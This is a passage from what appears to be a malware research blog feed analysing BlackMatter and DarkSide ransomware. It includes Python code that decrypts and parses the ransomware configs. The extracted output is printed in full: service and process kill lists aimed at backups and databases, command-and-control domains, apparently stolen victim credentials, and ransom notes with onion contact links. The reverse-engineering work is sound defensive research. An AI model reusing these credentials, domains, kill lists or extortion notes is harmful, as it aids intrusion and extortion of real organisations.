winword | steam | synctime | notepad | ocomm | onenote | mspub | thunderbird | agntsvc | sql | excel | powerpnt | outlook | wordpad | dbeng50 | isqlplussvc | sqbcoreservice | oracle | ocautoupds | dbsnmp | msaccess | tbirdconfig | ocssd | mydesktopservice | visio | | &#39; b&#39;mepocs | memtas | veeam | svc$ | backup | sql | vss | | &#39; b&#39;https://paymenthacks.com | http://paymenthacks.com | https://mojobiden.com | http://mojobiden.com | | &#39; b&#39;aheisler@hhcp.com:120Heisler | dsmith@hhcp.com:Tesla2019 | administrator@hhcp.com:iteam8** | | &#39; b&#34; ~+ r n * + r n &#39; BLACK | r n () .-.,=&#39;``&#39;=. - o - r n &#39;=/_ | r n * | &#39;=._ | r n `=./`, &#39; r n . &#39;=.__.=&#39; `=&#39; * r n + Matter + r n O * &#39; . r n r n&gt;&gt;&gt; What happens? r n Your network is encrypted, and currently not operational. We have downloaded 1TB from your fileserver. r n We need only money, after payment we will give you a decryptor for the entire network and you will restore all the data. r n r n&gt;&gt;&gt; What guarantees? r n We are not a politically motivated group and we do not need anything other than your money. r n If you pay, we will provide you the programs for decryption and we will delete your data. r n If we do not give you decrypters or we do not delete your data, no one will pay us in the future, this does not comply with our goals. r n We always keep our promises. r n r n&gt;&gt; Data leak includes r n1. Full emloyeers personal data r n2. Network information r n3. Schemes of buildings, active project information, architect details and contracts, r n4. Finance info r n r n r n&gt;&gt;&gt; How to contact with us? r n 1. Download and install TOR Browser (https://www.torproject.org/). r n 2. Open http://supp24yy6a66hwszu2piygicgwzdtbwftb76htfj7vnip3getgqnzxid.onion/7NT6LXKC1XQHW5039BLOV. r n r n&gt;&gt;&gt; Warning! Recovery recommendations. r n We strongly recommend you to do not MODIFY or REPAIR your files, that will damage them.&#34; b&#39;&#39; .",
            "url": "https://research.openanalysis.net/blackmatter/ransomware/malware/config/2021/10/28/blackmatter_ransomware.html",
            "relUrl": "/blackmatter/ransomware/malware/config/2021/10/28/blackmatter_ransomware.html",
            "date": " • Oct 28, 2021"
        }
        
    
  
    
        ,"post31": {
            "title": "Darkside Ransomware",
            "content": "Overview . Sample: 0A0C225F0E5EE941A79F2B7701F1285E4975A2859EB4D025D96D9E366E81ABB9 . References: . Malshare Sample | ChuongDong Blog | Cybergeeks Blog | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . API Hashing . A simple API hashing algorithm is used to resolve LoadLibraryA and GetProcAddress. . The rest of the dynamically resolved APIs are resolved via GetProcAddress once their function names have been decrypted. . kernel32_hash = 999818334 string = b&#39;k x00e x00r x00n x00e x00l x003 x002 x00. x00d x00l x00l x00&#39; hash_high = 0xffff hash_low = 0xffff for ptr in range(len(string)): hash_low = (hash_low + string[ptr]) hash_high = (hash_high + hash_low) hash_high %= 0xFFF1 hash_low %= 0xFFF1 hash = (hash_high &lt;&lt; 16) + hash_low print(hex(hash)) print(&#39;===&#39;) print(hex(kernel32_hash)) . 0x3b98045e === 0x3b98045e . API String Decryption . A unique decryption method is used to both decrypt the API strings as well as other data stored in the ransomware binary. The decryption is split into two main functions, one used to generate a decryption key buffer, and another used to perform the actual decryption. . import struct def gen_key_buffer(buf1, buf2): key_buffer = [0]*256 v3 = 240 v4 = buf1[:4] v5 = buf1[4:8] v6 = buf1[8:12] result = buf1[12:] v3 = 240 while v3 &gt;= 0: for i in range(4): key_buffer[v3 + i + 12 ] = v4[i] key_buffer[v3 + i + 8 ] = result[i] key_buffer[v3 + i + 4 ] = v5[i] key_buffer[v3 + i] = v6[i] v4 = struct.pack(&#39;&lt;I&#39;, (struct.unpack(&#39;&lt;I&#39;,v4)[0] - 0x10101010) &amp; 0xffffffff); result = struct.pack(&#39;&lt;I&#39;, (struct.unpack(&#39;&lt;I&#39;,result)[0] - 0x10101010) &amp; 0xffffffff); v5 = struct.pack(&#39;&lt;I&#39;, (struct.unpack(&#39;&lt;I&#39;,v5)[0] - 0x10101010) &amp; 0xffffffff); v6 = struct.pack(&#39;&lt;I&#39;, (struct.unpack(&#39;&lt;I&#39;,v6)[0] - 0x10101010) &amp; 0xffffffff); v3 -= 16 lo_v8 = 0 v9 = 0 v10 = 0 flag_return = False while True: if flag_return: break while True: lo_result = key_buffer[v9] &amp; 0xff lo_v8 = (lo_result + ((buf2[v10] + lo_v8) &amp; 0xff)) &amp; 0xff hi_result = key_buffer[lo_v8] v10 += 1 key_buffer[lo_v8] = lo_result key_buffer[v9] = hi_result if v10 &gt;= 16: break v9 += 1 v9 &amp;= 0xff if v9 == 0: flag_return = True break v10 = 0 v9 += 1 v9 &amp;= 0xff if v9 == 0: break return key_buffer def decrypt_data(data, key_buffer): data = list(data) data_len = len(data) key = key_buffer.copy() edx = 0 cl = 0 curr_index = 0 eax = 0 while data_len != 0: cl = (key[(1 + edx) &amp; 0xff] + cl) &amp; 0xFF eax = key[(1 + edx) &amp; 0xff] &amp; 0xFF ch = key[cl] &amp; 0xFF key[cl] = eax key[(1 + edx) &amp; 0xff] = ch eax = (ch + eax) &amp; 0xFF edx = (edx + 1) &amp; 0xff data[curr_index] ^= key[eax] curr_index += 1 data_len -= 1 return bytes(data) . Setup Decryption Key Buffer . KEY_BUFFER can be used in the decryption algorithms as a global . KEY_BUFFER = gen_key_buffer(unhex(&#39;edf9e5ed8640fd53ab185838646bd9df&#39;),unhex(&#39;92b2801a9c19867db6a5002936c1084a&#39;)) decrypt_data(unhex(&#39;7b0d2ddb284b&#39;),KEY_BUFFER) . b&#39;ntdll x00&#39; . Config Decryption Functions . Because the config file is so large it needs it&#39;s own custom decryption wrapper to decrypt 256 bytes at a time. The decryption routine also needs to handle 256 blocks of data. The config is also compressed using aplib and the values are base64 encoded. . The following functions will aid in the config decryption. . Large Data Decrypt . def decrypt_large_data(data, key_buffer): out = b&#39;&#39; for ptr in range(0,len(data),255): out += decrypt_data(data[ptr:ptr+255],key_buffer) return out . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . Config Decryption . The config is stored in the data or ndata section of the PE file. The first two 16-byte blocks are the components of the key buffer. Following the key material is a DWORD that indicates the size of the encrypted config. This is followed by the encrypted config itself. . The actual config decryption process is as follows. . Find the data section | Locate the size of the config at offset 0x20 | Extract the encrypted config | Decrypt config using the custom decryption algorithm | Decompress the resulting data using aplib | . import pefile import struct RANSOMWARE_FILE = r&#39;/tmp/darkside.bin&#39; data = open(RANSOMWARE_FILE, &#39;rb&#39;).read() pe = pefile.PE(data=data) # Get section with config section_data = None for s in pe.sections: if b&#39;ndata&#39; in s.Name: section_data = s.get_data() break # Extract config config_length = struct.unpack(&#39;&lt;I&#39;,section_data[0x20:0x24])[0] enc_data = section_data[0x24:0x24+config_length] # Decrypt config ap_data = decrypt_large_data(enc_data, KEY_BUFFER) # Decompress config data with aplib ptxt_data = aplib_decompress(ap_data) ptxt_data . b&#34; x01 x00 x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xef&amp;u&gt; x87 x15 xd8( xb1 xf3A xef xb1 xc9 xd3 xdbw xd2 x08 xad x1c/ xaa xd0, xf4 xc7 xbc&lt;s x89k xd9 x88!s xe31 xbe xd4 xcb}W x9d; xf5 xacnt xe5O x07gBe xed xc5 xc8 x1f xe5 x90 x8e xa4 xdeb * xe9 xac x90 x8d x03 xb3 x13 xc1 x9d* xb2 xb1]W x19 x08W x0fa x0e L xd8 xe2 xd2 t x11 x14Oo xf2 xd8a xca xc4 xa1 x81` xdb x15 x916 n xf5W xbc xc2 xe8 xb9D x13_j}Q xda x802 x90:u0607b8382472634 x00 xd0 x90 xe4 x95o xe6,&#39; x19VG x14wXCy x02 x01 x00 x01 x01 x01 x01 x01 x00 x01 x01 x01 x01 x01 x01 x01 x01 x01 x01 x01 x02 x010 x00 x00 x00 xdd x02 x00 x00. x04 x00 x00 xb7 x06 x00 x00 xd0 x06 x00 x00 xf1 x06 x00 x00 xb6 x07 x00 x00 x8b n x00 x00d x0b x00 x00 x00 x00 x00 x00 xb5 x0b x00 x00 xbe x0c x00 x00JAByAGUAYwB5AGMAbABlAC4AYgBpAG4AAABjAG8AbgBmAGkAZwAuAG0AcwBpAAAAJAB3AGkAbgBkAG8AdwBzAC4AfgBiAHQAAAAkAHcAaQBuAGQAbwB3AHMALgB+AHcAcwAAAHcAaQBuAGQAbwB3AHMAAABhAHAAcABkAGEAdABhAAAAYQBwAHAAbABpAGMAYQB0AGkAbwBuACAAZABhAHQAYQAAAGIAbwBvAHQAAABnAG8AbwBnAGwAZQAAAG0AbwB6AGkAbABsAGEAAABwAHIAbwBnAHIAYQBtACAAZgBpAGwAZQBzAAAAcAByAG8AZwByAGEAbQAgAGYAaQBsAGUAcwAgACgAeAA4ADYAKQAAAHAAcgBvAGcAcgBhAG0AZABhAHQAYQAAAHMAeQBzAHQAZQBtACAAdgBvAGwAdQBtAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4AAAB0AG8AcgAgAGIAcgBvAHcAcwBlAHIAAAB3AGkAbgBkAG8AdwBzAC4AbwBsAGQAAABpAG4AdABlAGwAAABtAHMAbwBjAGEAYwBoAGUAAABwAGUAcgBmAGwAbwBnAHMAAAB4ADYANABkAGIAZwAAAHAAdQBiAGwAaQBjAAAAYQBsAGwAIAB1AHMAZQByAHMAAABkAGUAZgBhAHUAbAB0AAAAAAB= x00YQB1AHQAbwByAHUAbgAuAGkAbgBmAAAAYgBvAG8AdAAuAGkAbgBpAAAAYgBvAG8AdABmAG8AbgB0AC4AYgBpAG4AAABiAG8AbwB0AHMAZQBjAHQALgBiAGEAawAAAGQAZQBzAGsAdABvAHAALgBpAG4AaQAAAGkAYwBvAG4AYwBhAGMAaABlAC4AZABiAAAAbgB0AGwAZAByAAAAbgB0AHUAcwBlAHIALgBkAGEAdAAAAG4AdAB1AHMAZQByAC4AZABhAHQALgBsAG8AZwAAAG4AdAB1AHMAZQByAC4AaQBuAGkAAAB0AGgAdQBtAGIAcwAuAGQAYgAAAAAA x00MwA4ADYAAABhAGQAdgAAAGEAbgBpAAAAYgBhAHQAAABiAGkAbgAAAGMAYQBiAAAAYwBtAGQAAABjAG8AbQAAAGMAcABsAAAAYwB1AHIAAABkAGUAcwBrAHQAaABlAG0AZQBwAGEAYwBrAAAAZABpAGEAZwBjAGEAYgAAAGQAaQBhAGcAYwBmAGcAAABkAGkAYQBnAHAAawBnAAAAZABsAGwAAABkAHIAdgAAAGUAeABlAAAAaABsAHAAAABpAGMAbAAAAGkAYwBuAHMAAABpAGMAbwAAAGkAYwBzAAAAaQBkAHgAAABsAGQAZgAAAGwAbgBrAAAAbQBvAGQAAABtAHAAYQAAAG0AcwBjAAAAbQBzAHAAAABtAHMAcwB0AHkAbABlAHMAAABtAHMAdQAAAG4AbABzAAAAbgBvAG0AZQBkAGkAYQAAAG8AYwB4AAAAcAByAGYAAABwAHMAMQAAAHIAbwBtAAAAcgB0AHAAAABzAGMAcgAAAHMAaABzAAAAcwBwAGwAAABzAHkAcwAAAHQAaABlAG0AZQAAAHQAaABlAG0AZQBwAGEAYwBrAAAAdwBwAHgAAABsAG8AYwBrAAAAawBlAHkAAABoAHQAYQAAAG0AcwBpAAAAcABkAGIAAAAAAH== x00YgBhAGMAawB1AHAAAAAAAC== x00cwBxAGwAAABzAHEAbABpAHQAZQAAAAAA x00dgBtAGMAbwBtAHAAdQB0AGUALgBlAHgAZQAAAHYAbQBtAHMALgBlAHgAZQAAAHYAbQB3AHAALgBlAHgAZQAAAHMAdgBjAGgAbwBzAHQALgBlAHgAZQAAAFQAZQBhAG0AVgBpAGUAdwBlAHIALgBlAHgAZQAAAGUAeABwAGwAbwByAGUAcgAuAGUAeABlAAAAAAB= x00cwBxAGwAAABvAHIAYQBjAGwAZQAAAG8AYwBzAHMAZAAAAGQAYgBzAG4AbQBwAAAAcwB5AG4AYwB0AGkAbQBlAAAAYQBnAG4AdABzAHYAYwAAAGkAcwBxAGwAcABsAHUAcwBzAHYAYwAAAHgAZgBzAHMAdgBjAGMAbwBuAAAAbQB5AGQAZQBzAGsAdABvAHAAcwBlAHIAdgBpAGMAZQAAAG8AYwBhAHUAdABvAHUAcABkAHMAAABlAG4AYwBzAHYAYwAAAGYAaQByAGUAZgBvAHgAAAB0AGIAaQByAGQAYwBvAG4AZgBpAGcAAABtAHkAZABlAHMAawB0AG8AcABxAG8AcwAAAG8AYwBvAG0AbQAAAGQAYgBlAG4AZwA1ADAAAABzAHEAYgBjAG8AcgBlAHMAZQByAHYAaQBjAGUAAABlAHgAYwBlAGwAAABpAG4AZgBvAHAAYQB0AGgAAABtAHMAYQBjAGMAZQBzAHMAAABtAHMAcAB1AGIAAABvAG4AZQBuAG8AdABlAAAAbwB1AHQAbABvAG8AawAAAHAAbwB3AGUAcgBwAG4AdAAAAHMAdABlAGEAbQAAAHQAaABlAGIAYQB0AAAAdABoAHUAbgBkAGUAcgBiAGkAcgBkAAAAdgBpAHMAaQBvAAAAdwBpAG4AdwBvAHIAZAAAAHcAbwByAGQAcABhAGQAAABuAG8AdABlAHAAYQBkAAAAAAA= x00dgBzAHMAAABzAHEAbAAAAHMAdgBjACQAAABtAGUAbQB0AGEAcwAAAG0AZQBwAG8AYwBzAAAAcwBvAHAAaABvAHMAAAB2AGUAZQBhAG0AAABiAGEAYwBrAHUAcAAAAEcAeABWAHMAcwAAAEcAeABCAGwAcgAAAEcAeABGAFcARAAAAEcAeABDAFYARAAAAEcAeABDAEkATQBnAHIAAAAAAH== x00YgBhAHIAbwBxAHUAZQB0AGUAZQBzAC4AYwBvAG0AAAByAHUAbQBhAGgAcwBpAGEALgBjAG8AbQAAAAAA x00VwBlAGwAYwBvAG0AZQAgAHQAbwAgAEQAYQByAGsAUwBpAGQAZQAhACAADQAKACAAIAANAAoAIABBAGwAbAAgAFkAbwB1AHIAIABGAGkAbABlAHMAIABBAHIAZQAgAEUAbgBjAHIAeQBwAHQAZQBkACEAIAANAAoAIAAgAA0ACgAgAEYAaQBuAGQAIAAlAHMAIABBAG4AZAAgAEYAbwBsAGwAbwB3ACAASQBuAHMAdAByAHUAYwB0AGkAbwBuAHMAIQAAAAAA x00LS0tLS0tLS0tLS0gWyBXZWxjb21lIHRvIERhcmtTaWRlIF0gLS0tLS0tLS0tLS0tLT4gDQogIA0KIFdoYXQgaGFwcGVuZD8gDQogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSANCiBZb3VyIGNvbXB1dGVycyBhbmQgc2VydmVycyBhcmUgZW5jcnlwdGVkLCBiYWNrdXBzIGFyZSBkZWxldGVkLiBXZSB1c2Ugc3Ryb25nIGVuY3J5cHRpb24gYWxnb3JpdGhtcywgc28geW91IGNhbm5vdCBkZWNyeXB0IHlvdXIgZGF0YS4gDQogQnV0IHlvdSBjYW4gcmVzdG9yZSBldmVyeXRoaW5nIGJ5IHB1cmNoYXNpbmcgYSBzcGVjaWFsIHByb2dyYW0gZnJvbSB1cyAtIHVuaXZlcnNhbCBkZWNyeXB0b3IuIFRoaXMgcHJvZ3JhbSB3aWxsIHJlc3RvcmUgYWxsIHlvdXIgbmV0d29yay4gDQogRm9sbG93IG91ciBpbnN0cnVjdGlvbnMgYmVsb3cgYW5kIHlvdSB3aWxsIHJlY292ZXIgYWxsIHlvdXIgZGF0YS4gDQogIA0KIERhdGEgbGVhayANCiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIA0KIEZpcnN0IG9mIGFsbCB3ZSBoYXZlIGRvd25sb2FkZWQgbW9yZSB0aGVuIDUwMEdCIGRhdGEgZnJvbSB5b3VyIG5ldHdvcmsuIA0KICANCiBJbmNsdWRlZDogDQogLUFjY291bnRpbmcgZGF0YSANCiAtRmluYW5jZSBkYXRhIA0KIC1IUiANCiAtRW1wbG95ZWVzIGNvbmZpZGVudGlhbCBkYXRhKHBob3RvcywgYmVuZWZpdHMsIHRheGVzLCBldGMpIA0KIC1NYXJrZXRpbmcgDQogLUJ1ZGdldHMgDQogLVRheGVzKHNhbGVzIHRheCBjb21wbGlhbmNlLCBwcm9wZXJ0eSwgaW5jb21lIGFuZCBmcmFuY2hpc2UgdGF4ZXMsIGV0YykgDQogLVBheXJvbGxzIA0KIC1CYW5raW5nIGRhdGEgDQogLUFyYml0cmF0aW9uIA0KIC1TY2FucyANCiAtSW5zdXJhbmNlIA0KIC1SZWNvbmNpbGlhdGlvbnMgDQogLVJlcG9ydHMobW9udGhseSBiYW5rIGludmVudG9yeSwgbW9udGhseSBmaW5hbmNpYWwsIGNsYWltcyByZXBvcnRzLCBldGMpIA0KIC1BdWRpdHMoREhHLCBpbnN1cmFuY2UgYXVkaXRzLCBldGMpIA0KIC1CMkIgY2xpZW50cyBjb25maWcgZGF0YSANCiAtQ29uZmlkZW50aWFsaXR5IDIwMjAgDQogLTIwMjAsIDIwMjEgQnVzaW5lc3MgcGxhbnMgDQogLTIwMTksIDIwMjAsIDIwMjEgeWVhcnMgQ2xvc2luZyAoZnVsbCBkdW1wcykgDQogLWFuZCBhIGxvdCBvZiBvdGhlciBzZW5zaXRpdmUgZGF0YSANCiAgDQogWW91ciBwZXJzb25hbCBsZWFrIHBhZ2U6IGh0dHA6Ly9kYXJrc2lkYzNpdXg0NjJuNnl1bmV2b2FnNTJudHZ3cDZ3dWxhejN6aXJrbWg0Y256NmhoajdpZC5vbmlvbi8xNjIvdGhlZGl4aWVncm91cC9MQ2Z5SFJjd2ZmcllUYmxwWnZvUE8zWERicllQY051MHdWQXNINXA0OUxTakJmelRtdGRYVDQ4YXpYRmxNdTdxIA0KIE9uIHRoZSBwYWdlIHlvdSB3aWxsIGZpbmQgZXhhbXBsZXMgb2YgZmlsZXMgdGhhdCBoYXZlIGJlZW4gZG93bmxvYWRlZC4gDQogVGhlIGRhdGEgaXMgcHJlbG9hZGVkIGFuZCB3aWxsIGJlIGF1dG9tYXRpY2FsbHkgcHVibGlzaGVkIGlmIHlvdSBkbyBub3QgcGF5LiANCiBBZnRlciBwdWJsaWNhdGlvbiwgeW91ciBkYXRhIHdpbGwgYmUgYXZhaWxhYmxlIGZvciBhdCBsZWFzdCA2IG1vbnRocyBvbiBvdXIgdG9yIGNkbiBzZXJ2ZXJzLiANCiAgDQogV2UgYXJlIHJlYWR5OiANCiAtIFRvIHByb3ZpZGUgeW91IHRoZSBldmlkZW5jZSBvZiBzdG9sZW4gZGF0YSANCiAtIFRvIGRlbGV0ZSBhbGwgdGhlIHN0b2xlbiBkYXRhLiANCiAgDQogIA0KIFdoYXQgZ3VhcmFudGVlcz8gDQogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSANCiBXZSB2YWx1ZSBvdXIgcmVwdXRhdGlvbi4gSWYgd2UgZG8gbm90IGRvIG91ciB3b3JrIGFuZCBsaWFiaWxpdGllcywgbm9ib2R5IHdpbGwgcGF5IHVzLiBUaGlzIGlzIG5vdCBpbiBvdXIgaW50ZXJlc3RzLiANCiBBbGwgb3VyIGRlY3J5cHRpb24gc29mdHdhcmUgaXMgcGVyZmVjdGx5IHRlc3RlZCBhbmQgd2lsbCBkZWNyeXB0IHlvdXIgZGF0YS4gV2Ugd2lsbCBhbHNvIHByb3ZpZGUgc3VwcG9ydCBpbiBjYXNlIG9mIHByb2JsZW1zLiANCiBXZSBndWFyYW50ZWUgdG8gZGVjcnlwdCBvbmUgZmlsZSBmb3IgZnJlZS4gR28gdG8gdGhlIHNpdGUgYW5kIGNvbnRhY3QgdXMuIA0KICANCiBIb3cgdG8gZ2V0IGFjY2VzcyBvbiB3ZWJzaXRlPyAgDQogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSANCiBVc2luZyBhIFRPUiBicm93c2VyOiANCiAxKSBEb3dubG9hZCBhbmQgaW5zdGFsbCBUT1IgYnJvd3NlciBmcm9tIHRoaXMgc2l0ZTogaHR0cHM6Ly90b3Jwcm9qZWN0Lm9yZy8gDQogMikgT3BlbiBvdXIgd2Vic2l0ZTogaHR0cDovL2RhcmsyNHp6MzZ4bTR5MnBod2U3eXZua2tra2h4aW9uaGZyd3A2N2F3cGIzcjNiZGNuZWl2b3FkLm9uaW9uL1c1N01SSTlDN1laSlVaRUFCQkJZUlFMU1VURzIySlo5TUFIMFdUMUlTSEM0MDVLUDdaMlVXWTNBSTNKNjhETk0gDQogIA0KIFdoZW4geW91IG9wZW4gb3VyIHdlYnNpdGUsIHB1dCB0aGUgZm9sbG93aW5nIGRhdGEgaW4gdGhlIGlucHV0IGZvcm06IA0KIEtleTogDQogIA0KIHVnOGxncFgzV3JGemxFSjZIQldsd0puZjdqZW1oZm5seEJ3OXBvcmoxdXVZRlRnS2J4SlFKTFlpdGVRUzdEd2dabjdkSDBmczdxUFBXbVo2aW5QdjVHVG1TSlpOQWpHTFZJamQ0U29peVRkR3lvcGhmMHpQQnh4NnVFQU9KeE0wV29vNFpHZUtWb1VESHRac3FaTm5oTUY3YVBoNTRWbktwSUpYaVpEYlpadzRQMDZ4VHV3MVVNZWlURTd3ZGc3SFdaTWVwQVZUekVJMlcwNFJia1BGUUhmVWdFRGNzbER4YnI4M0J2b3BZVFlHS0ZSbXROVU1IOE9zT1pRck90djUweFdEYU9mYnF4YnpmSE1KbTMwUUdhR3BneWxKSFFac3NjejNYQm53SWR2bHdCSjlLTjREVmdGZ3ppUmR2d0pyZkNQNllOMUNZVE9RZ3cxcnpxbUlVNEcxeEdZdjdyRTNqaUJZMXM0RDNZMjZTYnBwVGNlQVZNdTFtS3g1Q0ZJRTNFYnRjQXNOdEVxTEhEYlBuTUN2VTZBcHdwMTdUWEdvYjh4WEpwRURCWmhJemRUYUN1eWJjcHJ3Y0ZOVE96Y2NqYklIODFXMzlNcmNKaTltTk8za0hSZTVmeG1JRkt2Yzl2OGFRRGloR3lDNjVEdGRhYnlCamlkWEkxTnlOT05UNFBUeXJ4WXFnZmZQc05ERnV6ejJ5TXJYaVRBd3RBUVBxbnk1QkJKUXNmVmhwTFhUdG5MdldnMSANCiAgDQogISEhIERBTkdFUiAhISEgDQogRE8gTk9UIE1PRElGWSBvciB0cnkgdG8gUkVDT1ZFUiBhbnkgZmlsZXMgeW91cnNlbGYuIFdlIFdJTEwgTk9UIGJlIGFibGUgdG8gUkVTVE9SRSB0aGVtLiAgDQogISEhIERBTkdFUiAhISE=&#34; . Parsing The Config . The first 128 bytes of the config are the RSA exponent followed by the 128 bytes RSA modulus. . After the modulus is a 32 buffer containing a null terminated ascii string representing the affiliate ID followed by some random data. . Next is a 22 bytes buffer containing a series of binary configuration flags. . Next is a DWORD indicating where the start of the next configuration value. . The following config values are base64 encoded and seperated by null bytes. . import base64 ptr = 0 rsa_exponent = ptxt_data[ptr:128] ptr += 128 rsa_mod = ptxt_data[ptr:ptr+128] ptr += 128 affiliate_id_data = ptxt_data[ptr:ptr+32] affiliate_id = affiliate_id_data.split(b&#39; x00&#39;)[0] ptr+= 32 config_flags = ptxt_data[ptr:ptr+22] ptr+= 22 config_values_offset = struct.unpack(&#39;&lt;I&#39;,ptxt_data[ptr:ptr+4])[0] config_values_buffer = ptxt_data[ptr+config_values_offset:] config_values = [] for c in config_values_buffer.split(b&#39; x00&#39;): config_values.append(base64.b64decode(c).split(b&#39; x00 x00&#39;)) . Print Config Values . print(&quot;Affiliate ID: %s n&quot; % affiliate_id) for c in config_values: print(&quot;%s n&quot; % b&#39; | &#39;.join([s.replace(b&#39; x00&#39;,b&#39;&#39;) for s in c])) . Affiliate ID: b&#39;0607b8382472634&#39; b&#39;$recycle.bin | config.msi | $windows.~bt | $windows.~ws | windows | appdata | application data | boot | google | mozilla | program files | program files (x86) | programdata | system volume information | tor browser | windows.old | intel | msocache | perflogs | x64dbg | public | all users | default | | &#39; b&#39;autorun.inf | boot.ini | bootfont.bin | bootsect.bak | desktop.ini | iconcache.db | ntldr | ntuser.dat | ntuser.dat.log | ntuser.ini | thumbs.db | | &#39; b&#39;386 | adv | ani | bat | bin | cab | cmd | com | cpl | cur | deskthemepack | diagcab | diagcfg | diagpkg | dll | drv | exe | hlp | icl | icns | ico | ics | idx | ldf | lnk | mod | mpa | msc | msp | msstyles | msu | nls | nomedia | ocx | prf | ps1 | rom | rtp | scr | shs | spl | sys | theme | themepack | wpx | lock | key | hta | msi | pdb | | &#39; b&#39;backup | | &#39; b&#39;sql | sqlite | | &#39; b&#39;vmcompute.exe | vmms.exe | vmwp.exe | svchost.exe | TeamViewer.exe | explorer.exe | | &#39; b&#39;sql | oracle | ocssd | dbsnmp | synctime | agntsvc | isqlplussvc | xfssvccon | mydesktopservice | ocautoupds | encsvc | firefox | tbirdconfig | mydesktopqos | ocomm | dbeng50 | sqbcoreservice | excel | infopath | msaccess | mspub | onenote | outlook | powerpnt | steam | thebat | thunderbird | visio | winword | wordpad | notepad | | &#39; b&#39;vss | sql | svc$ | memtas | mepocs | sophos | veeam | backup | GxVss | GxBlr | GxFWD | GxCVD | GxCIMgr | | &#39; b&#39;baroquetees.com | rumahsia.com | | &#39; b&#39;Welcome to DarkSide! r n r n All Your Files Are Encrypted! r n r n Find %s And Follow Instructions! | | &#39; b&#39;-- [ Welcome to DarkSide ] -&gt; r n r n What happend? r n - r n Your computers and servers are encrypted, backups are deleted. We use strong encryption algorithms, so you cannot decrypt your data. r n But you can restore everything by purchasing a special program from us - universal decryptor. This program will restore all your network. r n Follow our instructions below and you will recover all your data. r n r n Data leak r n - r n First of all we have downloaded more then 500GB data from your network. r n r n Included: r n -Accounting data r n -Finance data r n -HR r n -Employees confidential data(photos, benefits, taxes, etc) r n -Marketing r n -Budgets r n -Taxes(sales tax compliance, property, income and franchise taxes, etc) r n -Payrolls r n -Banking data r n -Arbitration r n -Scans r n -Insurance r n -Reconciliations r n -Reports(monthly bank inventory, monthly financial, claims reports, etc) r n -Audits(DHG, insurance audits, etc) r n -B2B clients config data r n -Confidentiality 2020 r n -2020, 2021 Business plans r n -2019, 2020, 2021 years Closing (full dumps) r n -and a lot of other sensitive data r n r n Your personal leak page: 